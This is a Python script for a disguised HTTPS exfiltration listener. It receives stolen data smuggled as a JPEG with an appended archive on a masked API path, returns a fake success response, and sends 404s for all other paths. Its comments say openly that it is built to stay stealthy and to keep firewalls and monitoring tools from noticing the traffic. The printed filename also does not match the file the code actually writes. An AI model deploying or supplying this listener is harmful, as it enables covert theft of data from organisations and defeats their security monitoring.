import http.server
import ssl
import json

# Define a custom handler to process incoming exfiltration data
class ExfilHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # We define a specific 'masked' path. 
        # Requests to any other path will return a 404, hiding the true purpose of the server.
        if self.path == '/api/v1/uploads':
            # Identify the size of the incoming data from the HTTP headers
            content_length = int(self.headers['Content-Length'])
            
            # Read the raw binary data (this is the JPEG with the hidden .tar.gz appended)
            # We use self.rfile.read() to ensure we get the full stream
            post_data = self.rfile.read(content_length)

            # Save the captured binary blob to a file for later carving
            with open("msk_logo.jpeg", "wb") as f:
                f.write(post_data)

            # To stay stealthy, we send back a standard JSON response.
            # To an automated monitoring tool, this looks like a valid, successful API transaction.
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                'status': 'success', 
                'code': 200, 
                'transaction_id': 'AX-991'
            }
            self.wfile.write(json.dumps(response).encode())
            
            print(f"\n[!] ALERT: Received {content_length} bytes at /api/v1/uploads")
            print("[!] Data saved to received_payload.jpeg")
        else:
            # If anyone browses to the root or other paths, they see a generic 404
            self.send_response(404)
            self.end_headers()

# --- Server Configuration ---

# Bind to all interfaces on the standard HTTPS port (443)
server_address = ('0.0.0.0', 443)

# Initialize the modern SSL Context (TLS 1.2/1.3)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

# Load the self-signed certificates you generated via OpenSSL
# This encrypts the tunnel so firewalls cannot see the JPEG contents
context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

# Create the HTTP server instance using our custom Handler
httpd = http.server.HTTPServer(server_address, ExfilHandler)

# Wrap the server socket with our SSL context to enable HTTPS
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print("[*] Secure Masked Listener active on https://0.0.0.0:443/api/v1/uploads")
print("[*] Waiting for incoming JPEG exfiltration...")

# Keep the server running indefinitely
httpd.serve_forever()